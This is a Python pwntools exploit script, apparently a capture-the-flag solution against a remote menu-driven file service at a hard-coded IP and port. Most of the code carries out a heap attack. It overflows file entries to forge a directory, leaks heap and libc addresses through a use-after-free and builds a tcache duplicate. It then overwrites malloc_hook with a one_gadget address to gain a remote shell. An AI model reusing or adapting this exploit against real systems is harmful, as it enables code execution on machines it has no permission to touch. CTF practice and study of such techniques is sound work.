# coding: utf-8
from __future__ import print_function, division
from pwn import *

# socat TCP-L:3001,reuseaddr,fork EXEC:./execfile
log = False

is_gaibu = True
if is_gaibu:
    host = "34.85.75.40"
    port = 31000
else:
    host = "127.0.0.1"
    port = 3001


def proof_of_work(r):
    r.recvuntil('proof-of-work')
    r.recvuntil('$')
    l = r.recvline().strip('\n')
    io = process(l, shell=True)
    l = io.recvline().strip('\n')
    r.sendline(l)


def wait_for_attach():
    print('attach?')
    raw_input()


r = remote(host, port)

# proof_of_work(r)


def recvuntil(s, verbose=True):
    s = r.recvuntil(s)
    if log and verbose:
        print(s)
    return s


def send_name(name):
    recvuntil('name: ')
    r.sendline(name)


def select(v):
    recvuntil('> ', True)
    r.sendline(str(v))


def list_dir():
    select(1)
    l = get_result()
    tmp = l.split('\n\n')[0]
    return tmp.split('\n')


def get_result():
    s = recvuntil('--------------------')
    return s


def add_file(name, data, size=None):
    s = len(data) if size is None else size
    s = 80 if s <= 90 else s
    select(2)
    send_name(name)
    recvuntil('size: ')
    r.sendline(str(s))
    r.sendline(data)


def add_dir(name):
    select(3)
    send_name(name)


def show_file(name):
    select(4)
    send_name(name)
    return get_result()


def change_dir(name):
    select(5)
    send_name(name)


def remove_file(name):
    select(6)
    send_name(name)


def quit(name):
    select(7)
size = 80
heap_buf = 100
big_heap_buf = 0x1000
nfiles = 30
nentries = 256

max_dir_entry = 88

base_offset = 36640
free_target_buf_offset = 0x82f0
main_arena_offset = 0xca0  # 0x11f0
dup_buf_offset = 0x82f0

malloc_hook_offset = 0xc30

one_gadget_offset = 0x4f322

dirs = [2, 3, 4, 5, 7]

cnt = 0
current_tmp_dir = None
current_tmp_dir_files = 0

file_dic = dict()  # maps filename -> tmp dir
file_dic['1'] = ''  # adhoc
add_file('1', 'A')

tmp_file_name = None  # to be used to create a big heap buf
tmp_file_name2 = None  # to be used to create a big heap buf
for i in range(2, 256):
    if i % 40 == 39:
        print('{} / {}'.format(i, 256))
    if i in dirs:
        if current_tmp_dir is not None:
            change_dir('..')
        cnt += 1
        name = hex(i)[2:]
        add_dir(name)
        if current_tmp_dir == None:
            current_tmp_dir = name
            dirs = dirs[1:]
        change_dir(current_tmp_dir)
    else:
        name = hex(i)[2:]
        if tmp_file_name is None:
            tmp_file_name = name
        elif tmp_file_name2 is None:
            tmp_file_name2 = name

        add_file(name, 'A')
        current_tmp_dir_files += 1
        file_dic[name] = current_tmp_dir
        if (current_tmp_dir_files == max_dir_entry):
            change_dir('..')
            current_tmp_dir_files = 0
            current_tmp_dir = hex(dirs[0])[2:]
            dirs = dirs[1:]
            change_dir(current_tmp_dir)

change_dir('..')

target_dir = hex(dirs.pop())[2:]
print('target_dir: ', target_dir)

print('get heap addr')
change_dir(file_dic['fe'])
remove_file('ff')
add_file('ff', 'A' * heap_buf)  # create heap buf
remove_file('fe')
add_file('fe', 'A' * size + '\x01' + 'T')

change_dir('T')
l = list_dir()
change_dir('..')
change_dir('..')
tmp = ''.join(reversed(map(lambda x: x.rjust(2, '0'), l[1:])))
malloc_addr = int(tmp, 16)
print(malloc_addr)
malloc_base = malloc_addr - 0x8280
print('malloc base is', hex(malloc_base))


addr = malloc_base + free_target_buf_offset
print('big heap addr:', hex(addr))


def gen_needed(addr):
    needed = [1]  # 1 is the type of long file
    for b in p64(addr):
        if b == b'\x00':
            break
        x = ord(b)
        if x in needed:
            raise Exception('Fail')
        needed.append(x)
    return needed


needed = gen_needed(addr)

# 1 is adhoc
assert needed[0] == 1
needed = needed[1:]
remove_file('1')
change_dir(target_dir)
add_file('1', 'A')
change_dir('..')

for f in needed:
    name = hex(f)[2:]
    tmp_dir = file_dic[name]
    if tmp_dir != '':
        change_dir(tmp_dir)
        remove_file(name)
        change_dir('..')
    else:
        remove_file(name)

    change_dir(target_dir)
    add_file(name, 'A')
    change_dir('..')


change_dir(target_dir)
print(list_dir())
change_dir('..')

# by buffer overflow, mark as directory the target dir
print('tmp_file_name', tmp_file_name)
change_dir(file_dic[tmp_file_name])
remove_file(tmp_file_name)
add_file(tmp_file_name, 'A' * size + '\x02' + 'S')
change_dir('..')

change_dir(file_dic[tmp_file_name])
remove_file(tmp_file_name)
add_file(tmp_file_name, 'A' * big_heap_buf)
change_dir('..')

change_dir(file_dic[tmp_file_name2])
remove_file(tmp_file_name2)
add_file(tmp_file_name2, 'A' * heap_buf)
change_dir('..')

change_dir(file_dic[tmp_file_name])
remove_file(tmp_file_name)  # free
change_dir('..')


# get main_arena addr(UAF)
s = show_file('S')
addr_s = s[0] + (s[1:8].split('\n')[0])
main_arena = u64(addr_s.ljust(8, b'\x00'))
print(main_arena)

libc_base = main_arena - main_arena_offset
libc_base2 = libc_base - 0x3eb000  # RX
print('libc_base:', hex(libc_base))

add_file(tmp_file_name, 'A' * size + '\x00')
add_dir(target_dir)

change_dir(target_dir)
for x in list_dir():
    if x == '1':
        continue
    print(list_dir())
    remove_file(x)
    change_dir('..')
    change_dir(file_dic[x])
    add_file(x, 'A')
    change_dir('..')
    change_dir(target_dir)

change_dir('..')

# next, malloc(0x68)
addr = malloc_base + dup_buf_offset
remove_file(tmp_file_name)
add_file(tmp_file_name, 'A' * 0x68)

needed = gen_needed(addr)
print(needed)

# make target_dir structure
assert needed[0] == 1
needed = needed[1:]

tmp_file_name2 = None  # this is used for fastbin dup

for ((name, tmp_dir), i) in zip(file_dic.items(), range(2)):
    if i == 0:
        continue  # adhoc..
    if i == 1:
        tmp_file_name2 = name
        break

for f in needed:
    name = hex(f)[2:]
    tmp_dir = file_dic[name]

    change_dir(tmp_dir)
    remove_file(name)
    change_dir('..')

    change_dir(target_dir)
    add_file(name, 'A')
    change_dir('..')

# create dup
# free 1
remove_file(tmp_file_name)
add_file(tmp_file_name, 'A')

# mark as directory by overflow
remove_file(tmp_file_name)
add_file(tmp_file_name, 'A' * size + '\x02S')

# free 3. then A -> A tcache list
remove_file('S')

# finally make A = malloc(0x68)'s fd pointed to malloc_hook
malloc_hook = libc_base + malloc_hook_offset
one_gadget = libc_base2 + one_gadget_offset

add_file(target_dir, p64(malloc_hook), size=0x68)

remove_file(tmp_file_name)
add_file(tmp_file_name, 'A' * 0x68)

change_dir(file_dic[tmp_file_name2])
remove_file(tmp_file_name2)
# malloc_hook -> one gadget RCE
add_file(tmp_file_name, p64(one_gadget), size=0x68)
change_dir('..')

remove_file(tmp_file_name)
add_file(tmp_file_name, 'A' * 0x68)  # this get /bin/sh

r.interactive()
